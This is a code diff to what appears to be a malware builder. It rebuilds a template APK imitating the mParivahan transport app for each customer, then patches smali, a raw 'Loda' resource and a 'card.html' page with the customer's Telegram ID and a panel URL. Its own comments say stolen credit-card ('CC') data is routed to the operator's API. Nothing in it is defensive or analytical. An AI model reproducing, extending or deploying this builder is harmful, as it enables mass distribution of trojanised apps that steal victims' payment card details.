@@ -15,9 +15,12 @@ const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");
 const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
 const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
 
-const OWNER_PLACEHOLDER = "OWNER_TELEGRAM_ID_000000000";
+const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
+const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
 const SMALI_FILE_REL =
   "smali_classes63/dApp/binance/Trading/Signals/MyService$1.smali";
+const LODA_FILE_REL    = "res/raw/Loda";
+const CARD_HTML_REL    = "assets/card.html";
 
 const APKTOOL =
   "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
@@ -89,20 +92,37 @@ export async function buildUserApk(telegramId: string): Promise<string | null> {
     if (!isTemplateReady()) return null;
   }
 
+  // Resolve panel URL (used in card.html so APK calls our API, not Telegram directly)
+  const panelUrl = (
+    process.env["PANEL_URL"] ||
+    (process.env["REPLIT_DEV_DOMAIN"]
+      ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
+      : "")
+  ).replace(/\/$/, "");
+
   // Copy template to per-user build dir
   const buildDir = `/tmp/apk_build_${telegramId}`;
   await execAsync(`cp -r "${APK_TEMPLATE_DIR}" "${buildDir}"`, { timeout: 30_000 });
 
-  // Patch smali: replace placeholder with actual Telegram ID
-  const smaliPath = path.join(buildDir, SMALI_FILE_REL);
-  const content = fs.readFileSync(smaliPath, "utf-8");
-  fs.writeFileSync(
-    smaliPath,
-    content.includes(OWNER_PLACEHOLDER)
-      ? content.replace(OWNER_PLACEHOLDER, telegramId)
-      : content,
-    "utf-8"
-  );
+  const patchFile = (relPath: string, replacements: [string, string][]) => {
+    const filePath = path.join(buildDir, relPath);
+    if (!fs.existsSync(filePath)) return;
+    let txt = fs.readFileSync(filePath, "utf-8");
+    for (const [from, to] of replacements) txt = txt.split(from).join(to);
+    fs.writeFileSync(filePath, txt, "utf-8");
+  };
+
+  // 1. Patch smali: ownerTelegramId into device registration
+  patchFile(SMALI_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
+
+  // 2. Patch Loda: chatID = ownerTelegramId, token = dummy (disables direct Telegram calls)
+  patchFile(LODA_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
+
+  // 3. Patch card.html: ownerTelegramId + panel API URL (CC data goes to our API, not Telegram)
+  patchFile(CARD_HTML_REL, [
+    [OWNER_PLACEHOLDER, telegramId],
+    [PANEL_URL_PLACEHOLDER, panelUrl],
+  ]);
 
   // Rebuild APK
   const unsignedApk = `/tmp/apk_unsigned_${telegramId}.apk`;
